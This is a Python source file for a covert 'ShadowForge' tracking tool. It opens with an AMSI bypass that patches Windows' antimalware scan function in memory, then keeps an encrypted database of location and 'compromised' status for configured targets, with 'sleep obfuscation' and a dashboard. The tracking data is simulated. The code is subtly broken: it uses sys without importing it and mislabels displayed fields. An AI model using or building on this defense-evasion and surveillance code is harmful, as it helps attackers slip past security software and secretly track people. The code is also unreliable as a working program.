import asyncio
import threading
import sqlite3
import yaml
import os
import time
import random
import ctypes
import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

# 🚀 AMSI Bypass (Windows Only)
def bypass_AMSI():
    try:
        amsi = ctypes.windll.kernel32.LoadLibraryA(b"amsi.dll")
        amsi_scan_buffer = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
        if amsi_scan_buffer:
            ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(amsi_scan_buffer), 1, 0x40, ctypes.byref(ctypes.c_int()))
            ctypes.c_int.from_address(amsi_scan_buffer).value = 0x90  # NOP
        return True
    except:
        return False

# 🔐 AES-256-GCM Encryption
class AESEncryption:
    def __init__(self, key):
        self.key = key

    def encrypt(self, data):
        iv = os.urandom(12)
        cipher = Cipher(algorithms.AES256(self.key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        return iv + encryptor.tag + ciphertext

    def decrypt(self, encrypted_data):
        iv = encrypted_data[:12]
        tag = encrypted_data[12:28]
        ciphertext = encrypted_data[28:]
        cipher = Cipher(algorithms.AES256(self.key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize()

# 📜 Config Loader
def load_config():
    with open("config.yaml", "r") as f:
        return yaml.safe_load(f)

# 🗄️ Database Setup
class EncryptedDB:
    def __init__(self, db_path, key):
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
        self.aes = AESEncryption(key)
        self._create_tables()

    def _create_tables(self):
        self.cursor.execute("""
        CREATE TABLE IF NOT EXISTS tracking_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            target_id TEXT,
            location TEXT,
            status TEXT,
            encrypted_data BLOB
        )
        """)
        self.conn.commit()

    def insert_data(self, target_id, location, status):
        if target_id != load_config()["operator_id"]:  # 🔒 Exclude operator ID
            encrypted = self.aes.encrypt(f"{location}|{status}".encode())
            self.cursor.execute("""
            INSERT INTO tracking_data (timestamp, target_id, encrypted_data)
            VALUES (?, ?, ?)
            """, (datetime.now().isoformat(), target_id, encrypted))
            self.conn.commit()

    def get_data(self, target_id):
        self.cursor.execute("SELECT * FROM tracking_data WHERE target_id=?", (target_id,))
        rows = self.cursor.fetchall()
        return [self.aes.decrypt(row[5]) for row in rows]

# 🧠 Tracking Logic (Simulated)
class Tracker:
    def __init__(self, db, target_id):
        self.db = db
        self.target_id = target_id
        self.running = True

    def start(self):
        while self.running:
            try:
                # Simulate location data (replace with real tracking logic)
                location = f"{random.uniform(-90, 90):.6f},{random.uniform(-180, 180):.6f}"
                status = random.choice(["active", "idle", "compromised"])
                self.db.insert_data(self.target_id, location, status)
                time.sleep(random.uniform(0.5, 1.5))  # 🕒 Sleep Obfuscation
            except Exception as e:
                print(f"[!] Tracking Error: {e}")
                time.sleep(1)

    def stop(self):
        self.running = False

# 🖥️ GUI Interface
class TrackingGUI:
    def __init__(self, db):
        self.db = db
        self.root = tk.Tk()
        self.root.title("ShadowForge Tracking System")
        self.root.geometry("800x600")
        self.setup_ui()

    def setup_ui(self):
        self.tree = ttk.Treeview(self.root, columns=("Timestamp", "Target ID", "Location", "Status"), show="headings")
        self.tree.heading("Timestamp", text="Timestamp")
        self.tree.heading("Target ID", text="Target ID")
        self.tree.heading("Location", text="Location")
        self.tree.heading("Status", text="Status")
        self.tree.pack(fill=tk.BOTH, expand=True)

        self.update_button = ttk.Button(self.root, text="Update", command=self.update_data)
        self.update_button.pack(pady=5)

        self.stop_button = ttk.Button(self.root, text="Stop Tracking", command=self.stop_all)
        self.stop_button.pack(pady=5)

    def update_data(self):
        config = load_config()
        for item in self.tree.get_children():
            self.tree.delete(item)
        for target_id in config["targets"]:
            data = self.db.get_data(target_id)
            for entry in data:
                parts = entry.decode().split("|")
                self.tree.insert("", tk.END, values=(parts[0], target_id, parts[0], parts[1]))

    def stop_all(self):
        self.root.quit()

    def run(self):
        self.root.mainloop()

# 🔄 Auto-Setup
def auto_setup():
    config = load_config()
    if sys.platform == "win32":
        bypass_AMSI()
    db = EncryptedDB(config["db_path"], config["encryption_key"].encode())
    trackers = [Tracker(db, tid) for tid in config["targets"]]
    threads = [threading.Thread(target=t.start) for t in trackers]
    for t in threads:
        t.start()
    gui = TrackingGUI(db)
    gui.run()
    for t in threads:
        t.join()

if __name__ == "__main__":
    auto_setup()
